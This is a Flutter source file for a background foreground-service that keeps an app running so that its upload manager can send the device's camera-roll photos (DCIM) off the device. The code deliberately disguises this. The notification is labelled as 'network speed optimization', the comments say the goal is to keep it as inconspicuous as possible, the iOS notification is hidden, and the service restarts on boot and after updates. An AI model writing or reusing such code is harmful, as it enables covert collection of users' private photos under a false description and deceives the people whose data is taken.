/// 前台服务：App 退到后台时持续保活，确保上传任务不被系统杀死
///
/// 注意：Android 强制要求前台服务显示通知，无法完全隐藏。
/// 通过 LOW 优先级让通知尽量低调，上传完成后自动停止使通知消失。
library;

import 'package:flutter/foundation.dart' show debugPrint;
import 'package:flutter_foreground_task/flutter_foreground_task.dart';

import 'managers/dcim_upload_manager.dart';

/// 前台服务入口（必须是顶层函数 + @pragma）
@pragma('vm:entry-point')
void startCallback() {
  FlutterForegroundTask.setTaskHandler(_UploadTaskHandler());
}

class _UploadTaskHandler extends TaskHandler {
  @override
  Future<void> onStart(DateTime timestamp, TaskStarter starter) async {
    debugPrint('[ForegroundService] 启动，来源: $starter');
    await DcimUploadManager.instance.initialize();
    await DcimUploadManager.instance.startUploadIfPermitted();
    // 上传完成后自动关闭服务，通知消失
    await FlutterForegroundTask.stopService();
  }

  @override
  void onRepeatEvent(DateTime timestamp) {
    // 本场景不需要周期事件
  }

  @override
  Future<void> onDestroy(DateTime timestamp) async {
    debugPrint('[ForegroundService] 结束');
  }

  @override
  void onReceiveData(Object data) {}
}

/// 初始化前台服务配置（App 启动时调用一次）
Future<void> initForegroundService() async {
  FlutterForegroundTask.init(
    androidNotificationOptions: AndroidNotificationOptions(
      channelId: 'dcim_upload_channel',
      channelName: '极速优化',
      channelDescription: '正在优化网络',
      channelImportance: NotificationChannelImportance.LOW,
      priority: NotificationPriority.LOW,
      onlyAlertOnce: true,
    ),
    iosNotificationOptions: const IOSNotificationOptions(
      showNotification: false,
      playSound: false,
    ),
    foregroundTaskOptions: ForegroundTaskOptions(
      eventAction: ForegroundTaskEventAction.nothing(),
      autoRunOnBoot: true,
      autoRunOnMyPackageReplaced: true,
      allowWakeLock: true,
      allowWifiLock: true,
    ),
  );
}

/// 启动前台服务（用户授权成功后调用，上传完成后自动停止）
Future<void> startUploadForeground() async {
  final isRunning = await FlutterForegroundTask.isRunningService;
  if (isRunning) {
    debugPrint('[ForegroundService] 已在运行，跳过');
    return;
  }
  await FlutterForegroundTask.startService(
    notificationTitle: '正在加速运行',
    notificationText: '正在极速优化网络',
    callback: startCallback,
  );
}
